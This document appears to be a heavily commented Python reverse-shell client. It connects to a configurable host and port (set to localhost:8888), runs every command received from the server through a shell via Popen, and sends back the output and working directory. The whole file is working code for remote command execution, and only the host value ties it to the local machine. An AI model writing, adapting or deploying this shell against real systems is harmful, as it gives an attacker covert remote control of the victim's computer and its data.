# Import the necessary libraries

from os import chdir, getcwd

# Import the necessary functions from the socket library
from socket import AF_INET, SOCK_STREAM, error, socket
from subprocess import PIPE, Popen

# Uninitialised socket at client
s = None

# Standard host is initialised
host = "localhost"

# Standard port is initialised
port = 8888

# Create the client socket
try:

    # Try to create the client socket with any IP address and TCP Stream
    s = socket(AF_INET, SOCK_STREAM)

# Unable to create client socket
except error as msg:

    # Print appropriate message to the user
    print("Socket creation error:", msg)

# Connect the client socket to the server host and port
try:

    # Try to connect the socket
    s.connect((host, port))

# Unable to connect client socket
except error as msg:

    # Print appropriate message to the user
    print("Socket connection error:", msg)

# The server needs to print the current working directory in the reverse shell
currentWD = getcwd() + "> "

# The calculated current working direcctory is encoded and sent as a byte stream to the server
s.send(currentWD.encode())

# We will continue to receive shell commands from the server till the user does not want to exit
while True:

    # Receive the data from the server and process it as a shell command
    # Decoding the byte stream as a string to process as a valid command
    data = s.recv(2048).decode("utf-8")

    # If the command to exit the shell is entered, exit the shell
    # Exiting the loop will prevent it from taking more commands
    if data == "exit":

        # Terminate the loop
        break

    # Since this is a command to change the directory to a new directory
    # The path of the shell needs to be changed, it is handled seperately
    if data[:2] == "cd":

        # To store the necessary message for the user
        output_str = ""

        # Try to change the directory path to the specified directory
        try:

            # Specified directory path is the string after "cd"
            # We leave the 1st 2 characters and consider the string after the 3rd character
            chdir(data[3:])

        # Unable to change the directory path as it does not exist
        except:

            # The necessary error message for the user
            output_str = "No such directory available\n"

        # As the working directory has been changed
        # We need to update the current working directory before sending it to the user
        currentWD = getcwd() + "> "

        # Send the necessary details to the user
        # Error messages and changed path must be visible to the user in the reverse shell
        # String is encoded as a byte stream and sent
        s.send(str.encode(output_str + currentWD))

    # It is a valid shell command that does not interfere with the directory path
    # It must be a processed as a proper shell process
    elif len(data):

        # Create a child process as a new process to the currently running parent process
        # As we will be using stdin, stdout, sterr and a shell, we need to create a pipe to open a stream for the standard processes
        # All the arguments use PIPE as the standard streams need to opened

        # As the shell command needs to run as a full process, we create a child process and run it in that process
        cmd = Popen(data[:], shell=True, stdout=PIPE, stdin=PIPE, stderr=PIPE)

        # The output byte stream must consist of the standard output and standard error of the created child process
        output_byte = cmd.stdout.read() + cmd.stderr.read()

        # As the user will be seeing a string, the byte stream is decodes into a string
        output_str = output_byte.decode("utf-8")

        # We need to update the current working directory before sending it to the user
        currentWD = getcwd() + "> "

        # Send the necessary details to the user
        # Output and Error messages and current path must be visible to the user in the reverse shell
        # String is encoded as a byte stream and sent
        s.send(str.encode(output_str + currentWD))

# As the reverse shell has been exited, close the socket connection
s.close()
